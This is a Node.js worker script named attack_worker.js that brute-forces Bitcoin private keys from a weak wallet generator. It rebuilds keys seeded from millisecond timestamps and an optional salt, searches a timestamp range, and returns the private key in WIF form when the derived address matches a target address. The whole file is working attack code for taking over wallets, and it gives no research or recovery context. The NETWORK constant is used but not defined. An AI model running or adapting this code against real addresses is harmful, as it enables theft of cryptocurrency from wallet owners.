// attack_worker.js
const { workerData, parentPort } = require('worker_threads');
const crypto = require('crypto');
const bitcoin = require('bitcoinjs-lib');

function Wv(f) {
  if (f === void 0) return;
  const cleaned = f.trim().toLowerCase();
  return cleaned.length > 0 ? cleaned : void 0;
}

function bl(buf) {
  return crypto.createHash('sha256').update(crypto.createHash('sha256').update(buf).digest()).digest();
}

function $v(seed) {
  let state = seed >>> 0;
  return () => {
    state = Math.imul(1664525, state) + 1013904223 >>> 0;
    return state / 4294967296;
  };
}

function Pv(seed, func) {
  const originalRandom = Math.random;
  Math.random = $v(seed);
  try {
    return func();
  } finally {
    Math.random = originalRandom;
  }
}

function tp(u, f) {
  const r = Wv(f);
  const baseStr = r ? `${u}:${r}` : `${u}`;
  const c = Buffer.from(baseStr, 'utf8');
  const seed = bl(c).readUInt32LE(0);
  const p = Buffer.alloc(32);

  Pv(seed, () => {
    for (let i = 0; i < p.length; i++) {
      p[i] = Math.floor(Math.random() * 256);
    }
  });

  let x = Buffer.from(bl(p));
  const Jv = 1500;
  for (let i = 0; i < Jv; i++) {
    x = Buffer.from(bl(x));
  }

  while (true) {
    try {
      bitcoin.ECPair.fromPrivateKey(x, { network: NETWORK });
      break;
    } catch (e) {
      x = Buffer.from(bl(x));
    }
  }
  return x;
}

function ep(u, f) {
  const privateKeyBytes = tp(u, f);
  const keyPair = bitcoin.ECPair.fromPrivateKey(privateKeyBytes, { network: NETWORK });
  const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: NETWORK });
  return { address, privateKeyWIF: keyPair.toWIF(), timestamp: u };
}


const { start_ts, end_ts, salt, targetAddress, workerIndex } = workerData;
const totalToCheck = end_ts - start_ts;
let checked = 0;
const progressInterval = 50000;

let nextProgressUpdate = progressInterval;

for (let ts_ms = start_ts; ts_ms <= end_ts; ts_ms++) {
    try {
        const wallet = ep(ts_ms, salt);
        if (wallet.address === targetAddress) {
            parentPort.postMessage({ type: 'result', found: true, wallet, workerIndex });
            return;
        }
    } catch (e) {}

    checked++;
    if (checked >= nextProgressUpdate) {
        parentPort.postMessage({ type: 'progress', checked: checked, totalToCheck: totalToCheck, workerIndex });
        nextProgressUpdate += progressInterval;
    }
}

parentPort.postMessage({ type: 'result', found: false, workerIndex });